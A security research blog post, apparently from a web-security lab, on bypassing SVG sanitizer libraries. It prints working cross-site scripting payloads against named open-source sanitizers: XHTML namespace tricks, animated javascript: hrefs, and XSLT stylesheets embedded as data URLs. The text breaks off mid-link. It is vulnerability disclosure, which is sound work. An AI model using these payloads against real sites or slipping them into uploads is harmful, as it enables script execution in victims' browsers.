  content: "# Scalable Vector Grief\n\n- \n- \n- \n- \n- \n- \n\n ![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)\n\n###
    [Gareth Heyes](/research/gareth-heyes)\n\nResearcher\n\n[@garethheyes](https://twitter.com/garethheyes)\n\n-
    **Published:** Tuesday, 27 October 2026 at 14:29 UTC\n\n- **Updated:** Tuesday,
    27 October 2026 at 14:29 UTC\n\n- \n\n ![An illustration showing an SVG document
    and curves breaking](/cms/images/11/0b/c71d-article-article.png)\n\n**I tested
    eight popular SVG sanitizers and bypassed six of them. In this post, I'll show
    you how a response header can run JavaScript in Firefox even when the response
    body is completely harmless XML. I'll also show you how to get Safari to import
    a GIF as SVG and execute JavaScript from it.&nbsp;**\n\n## Hacking SVG sanitizers\n\n###
    The targets\n\nSVG is an image format that can contain scripts, event handlers,
    links, animations and even embedded HTML, so applications that accept SVG uploads
    usually run them through a sanitizer first. To see how well those sanitizers hold
    up, I tested the most popular SVG libraries according to ChatGPT:\n\n- [https://github.com/darylldoyle/svg-sanitizer](https://github.com/darylldoyle/svg-sanitizer)\n\n-
    [https://github.com/cloudflare/svg-hush](https://github.com/cloudflare/svg-hush)\n\n-
    [https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)\n\n-
    [https://github.com/Borewit/svg-sanitizer](https://github.com/Borewit/svg-sanitizer)\n\n-
    [https://github.com/bgalek/safe-svg](https://github.com/bgalek/safe-svg)\n\n-
    [https://github.com/mattkrick/sanitize-svg](https://github.com/mattkrick/sanitize-svg)\n\n-
    [https://github.com/alnorris/SVG-Sanitizer](https://github.com/alnorris/SVG-Sanitizer)\n\n-
    [https://github.com/jams2/py-svg-hush](https://github.com/jams2/py-svg-hush)\n\n###
    Warming up: namespace confusion\n\n**Library affected: mattkrick/sanitize-svg**\n\nThis
    library has so many bypasses that I'll only cover the interesting ones.\n\nMy
    first finding was that you don't need `<foreignObject>` to get HTML into an SVG.
    Switch the XML namespace on a single element to XHTML and the browser renders
    it as HTML directly inside the SVG. A `<frame>` with a JavaScript URL is all it
    takes:\n\n`<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><frame
    xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(document.domain)\"/></svg>`\n\nThe
    same namespace trick works with iframes, which gives you srcdoc to play with:\n\n`<svg
    xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"50\"><iframe xmlns=\"http://www.w3.org/1999/xhtml\"
    width=\"200\" height=\"50\" srcdoc=\"&lt;script&gt;alert(document.domain)&lt;/script&gt;\"/></svg>`\n\nThe
    library could also be bypassed with a plain old `<foreignObject>`. It renders
    the SVG, which converts the element name to its camel-case form, foreignObject.
    It then hunts for the element with `querySelectorAll('foreignobject')`, which
    finds nothing, so the payload goes straight through:\n\n`<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignobject><img
    src=x onerror=alert(1)></foreignobject></svg>`\n\nEven a nested SVG with an onload
    handler got through:\n\n`<svg xmlns=\"http://www.w3.org/2000/svg\"><svg onload=\"alert(1)\"/></svg>`\n###
    Animating your way to a JavaScript URL\n\n**Library affected: Borewit/svg-sanitizer**\n\nThis
    one didn't take much effort. The library let `<animate>` tags through untouched,
    so you could animate a link's href into a JavaScript URL:\n\n`<svg xmlns=\"http://www.w3.org/2000/svg\"><a><animate
    attributeName=\"href\" values=\"JavaScript:alert(1)\"/><text x=\"20\" y=\"20\">XSS</text></a></svg>\r\n`\n\nI
    bypassed the same library a second way using [Kevin Mizu's](https://x.com/kevin_mizu)[trick](https://mizu.re/post/dompurify-bypass-smil-animatetransform-safari),
    which uses \\<animateTransform\\> to set a JavaScript URL in Safari:\n\n`<svg
    xmlns=\"http://www.w3.org/2000/svg\" width=\"800\" height=\"120\" viewBox=\"0
    0 1000 120\"><a id=\"target\" href=\"#safe\"><text x=\"20\" y=\"55\" font-size=\"26\">Wait
    one second, then click</text><animateTransform attributeName=\"href\" type=\"invalid\"
    values=\"XXX;javascript:alert(1)//\" begin=\"0s\" dur=\"0.1s\" fill=\"freeze\"></animateTransform></a></svg>\r\n`\n###
    XSS from a self-contained XSLT stylesheet\n\n**Libraries affected: bgalek/safe-svg,
    mattkrick/sanitize-svg, alnorris/SVG-Sanitizer**\n\nNow things get more interesting.
    This is a pretty epic technique: you can get JavaScript execution from an XSLT
    stylesheet without needing a separate file. I was desperate to blog this one,
    because unfortunately the feature is deprecated and due for removal November 2026.\n\nThe
    trick is to point an xml-stylesheet processing instruction at a data URL. Base64
    is the most elegant way to encode the stylesheet, but URL encoding works too:\n\n`<?xml-stylesheet
    type=\"text/xsl\" href=\"data:text/xsl;base64,...\"?>`\n\nHere's the stylesheet
    that gets base64 encoded:\n\n`<x:stylesheet xmlns:x=\"http://www.w3.org/1999/XSL/Transform\"
    version=\"1.0\"><x:output method=\"html\"/><x:template match=\"/\"><html><body><x:element
    name=\"{concat('scr','ipt')}\">alert(document.domain)</x:element></body></html></x:template></x:stylesheet>\r\n`\n\nIt
    matches the root of the document and outputs an HTML page containing a script
    that alerts document.domain, proving the code runs in the document's origin rather
    than a null origin. Put it all together and you get this:\n\n`<?xml version=\"1.0\"
    encoding=\"UTF-8\"?><?xml-stylesheet type=\"text/xsl\" href=\"data:text/xsl;base64,\"?><svg
    xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"50\"><text x=\"10\"
    y=\"30\">XSS</text></svg>`\n### Turning a response header into XSS\n\nIn the back
    of my mind was a trick [Paulos Yibelo](https://x.com/PaulosYibelo) once told me
    about: Firefox lets you load external CSS files using a Link response header.
    I figured out that data URLs work there too, which got me thinking: if it works
    for CSS, could it work for XSLT too? You're damn right it can.\n\nFirst, I needed
    a version of the stylesheet that fits in a URL. This one has two layers. The outer
    stylesheet is URL encoded into a data URL. Inside it, XSLT's `document()` function
    loads a second data URL, URL encoded again, containing an XHTML `<img>` with an
    `onerror` handler. The stylesheet copies that into a `<foreignObject>`, where
    it fires.\n\nAs a processing instruction, it looks like this:\n\n`<?xml version=\"1.0\"
    encoding=\"UTF-8\"?><?xml-stylesheet type=\"text/xsl\" href=\"data:application/xml,...\"?>`\n\nHere's
    the payload before encoding. I've left the Hackvertor tags in so you can see where
    each layer of URL encoding is applied:\n\n`<@encode(url)><xsl:stylesheet version=\"1.0\"
    xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><svg
    xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"200\"><foreignObject
    width=\"400\" height=\"200\"><xsl:copy-of select=\"document('data:application/xml,<@encode(url)><div
    xmlns=\"http://www.w3.org/1999/xhtml\"><img src=\"1\" onerror=\"alert(document.domain)\"
    /></div></@encode>')/*\"/></foreignObject></svg></xsl:template></xsl:stylesheet></@encode>\r\n`\n\nYou
    can load and [edit the full payload in Hackvertor](https://hackvertor.co.uk/#"
